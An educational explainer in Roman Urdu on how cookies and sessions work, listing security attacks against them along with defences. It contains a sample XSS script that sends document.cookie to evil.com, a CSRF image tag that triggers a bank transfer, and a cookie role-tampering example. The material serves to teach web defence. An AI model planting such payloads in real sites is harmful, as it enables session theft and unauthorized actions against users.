üç™ Cookies - Tafseel

Cookies Kya Hain?

Cookies data ke chote tukde hote hain jo ek server user ke web browser ko bhejta hai. Browser in cookies ko store karta hai aur har agle request ke saath dobara usi server ko wapas bhejta hai.


Inka bunyadi maqsad stateful information ko yaad rakhna ya user ki browsing activity ko record karna hota hai.

‚ö†Ô∏è Cookies Ke Security Concerns

1. Cross-Site Scripting (XSS)

Agar koi hamla karne wala (attacker) website mein malicious script inject kar sakta hai, to woh user ki cookies chura sakta hai, khaas tor par agar HttpOnly flag set na ho.

<script> document.location='http://evil.com/steal?cookie='+document.cookie; </script>

Solution: HttpOnly flag set karein taake JavaScript se cookies access na hon.

2. Cross-Site Request Forgery (CSRF)

Cookies requests ke saath automatically bheji jaati hain, jiska faida uthaya ja sakta hai agar website CSRF protection implement na kare.

<img src="http://bank.com/transfer?to=attacker&amount=1000">

Solution: CSRF tokens istemal karein aur SameSite attribute set karein.

3. Insecure Transmission

Agar cookies unencrypted HTTP par bheji jaati hain (bina Secure flag ke), to unko intercept kiya ja sakta hai.

HTTP/1.1 200 OK Set-Cookie: sessionid=abc123 ‚Üê No Secure flag! Vulnerable to interception!

Solution: Hamesha Secure flag use karein aur HTTPS enforce karein.

4. Cookie Manipulation

Attackers browser mein cookies ko modify kar sakte hain agar proper validation na ho.

Cookie: role=user Modified: Cookie: role=admin

Solution: Server-side validation aur signed/encrypted cookies.

üîê Sessions - Tafseel

Sessions Kya Hain?

Jab ke cookies client-side (browser) par store hoti hain, sessions bunyadi tor par server-side par manage kiye jaate hain.


Session se muraad user aur web application ke darmiyan interaction ka ek waqfa hai. Kyunkay HTTP stateless hai, sessions server ke liye user ki state ko multiple requests par "yaad rakhne" ka tareeqa faraham karte hain.

‚ö†Ô∏è Sessions Ke Security Concerns

1. Session Hijacking

Agar koi hamla karne wala ek valid session ID haasil kar leta hai, to woh user ki naqal kar sakta hai.

Methods: ‚Üí Cookie chori (XSS) ‚Üí Network sniffing (unencrypted) ‚Üí Session IDs ko brute-force karna ‚Üí Session ID prediction

Solution: HTTPS use karein, strong session IDs generate karein, HttpOnly/Secure flags set karein.

2. Session Fixation

Ek hamla karne wala user ko log in karne se pehle ek valid session ID faraham kar sakta hai. Agar server kamyab login ke baad naya session ID generate nahi karta, to attack successful ho jata hai.

1. Attacker gets session ID: ABC123 2. Tricks user to use this ID 3. User logs in with ID ABC123 4. Attacker now logged in as user!

Solution: Login ke baad hamesha naya session ID generate karein.

3. Insecure Session Storage

Agar server par session data ko mehfooz tareeqe se store nahi kiya jaata ya theek se invalidate nahi kiya jaata, to security issues paida hote hain.

Risks: ‚Üí Session data exposed in logs ‚Üí Sessions not properly destroyed ‚Üí Weak session storage (files vs database) ‚Üí No encryption of sensitive session data

Solution: Secure storage mechanisms aur proper cleanup.

4. Session Timeout

Sessions ke liye munasib timeouts hone chahiye taa ke hamla karne walon ke liye mauqa kam ho.

Problems: ‚Üí Too long: Hijacking risk increases ‚Üí Too short: Bad user experience ‚Üí No timeout: Sessions never expire!

Solution: Balance timeout (15-30 min idle) aur absolute timeout (8-12 hours).

üìù Mukhtasar

Key Takeaways:

  • ‚Üí Cookies: Client-side storage, browser mein store, limited size
  • ‚Üí Sessions: Server-side storage, session ID cookies mein transport
  • ‚Üí Security Flags: HttpOnly, Secure, SameSite zaroori hain
  • ‚Üí Attacks: XSS, CSRF, Session Hijacking, Fixation
  • ‚Üí Best Practices: HTTPS, strong IDs, proper timeouts
  • ‚Üí API Hacking: Authentication bypass, privilege escalation
  • ‚Üí State Management: HTTP stateless hai, cookies/sessions state maintain karte hain

üéØ Conclusion: Cookies aur sessions kaise kaam karte hain, isko samajhna bohot zaroori hai kyunkay inke implementation mein mojood vulnerabilities ka faida uthana authentication bypass, privilege escalation, aur ghair-ikhtiyari (unauthorized) taur par sensitive information tak rasai ka sabab ban sakta hai. Yeh API security testing ka critical component hai!
